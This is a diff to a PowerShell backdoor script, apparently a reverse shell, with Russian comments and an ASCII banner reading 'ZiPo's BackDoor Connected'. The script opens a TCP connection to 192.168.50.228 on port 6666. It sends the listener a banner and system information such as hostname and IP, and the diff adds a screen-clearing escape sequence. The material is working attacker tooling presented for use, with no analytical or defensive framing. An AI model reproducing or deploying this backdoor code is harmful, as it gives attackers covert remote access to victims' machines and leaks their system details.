@@ -2,7 +2,12 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 
-# ASCII-совместимый баннер
+# ANSI escape code для очистки экрана и перемещения курсора влево вверх
+$clearScreen = [System.Text.Encoding]::ASCII.GetBytes("`e[2J`e[H")
+$stream.Write($clearScreen, 0, $clearScreen.Length)
+$stream.Flush()
+
+# ASCII-баннер
 $banner = @"
  ________  .__              __________                .___           
  \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
@@ -10,7 +15,7 @@ $banner = @"
   |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
  /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
          \/        \/\/                                      \/    \/ 
-             NEW ZiPo's BackDoor Connected
+             ZiPo's BackDoor Connected
 "@
 
 # Системная информация
@@ -24,9 +29,9 @@ IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressT
 ---------------------------------------------------
 "@
 
-# Объединённый текст
-$allInfo = "$banner`n$sysinfo"
-$introBytes = [System.Text.Encoding]::ASCII.GetBytes($allInfo)
+# Объединение и отправка
+$intro = "$banner`n$sysinfo"
+$introBytes = [System.Text.Encoding]::ASCII.GetBytes($intro)
 $stream.Write($introBytes, 0, $introBytes.Length)
 $stream.Flush()
 Start-Sleep -Milliseconds 300
